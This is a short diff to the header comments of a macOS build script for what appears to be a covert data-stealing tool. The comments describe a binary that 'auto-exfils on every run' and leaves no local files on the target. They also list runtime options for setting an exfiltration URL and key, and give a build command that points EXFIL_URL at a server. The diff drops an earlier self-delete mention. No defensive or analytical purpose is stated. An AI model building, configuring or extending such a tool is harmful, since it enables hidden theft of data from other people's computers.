@@ -4,8 +4,8 @@
 #   pip3 install cryptography pyinstaller
 #   chmod +x build_mac.sh && ./build_mac.sh
 #
-# The resulting binary auto-exfils on every run, leaves no local files, and self-deletes.
-# Override at runtime with: --out PATH  --no-self-delete  --exfil URL  --exfil-key KEY
+# The resulting binary auto-exfils on every run and leaves no local files on the target.
+# Override at runtime with: --out PATH  --exfil URL  --exfil-key KEY
 #
 # To point at a different server:
 #   EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
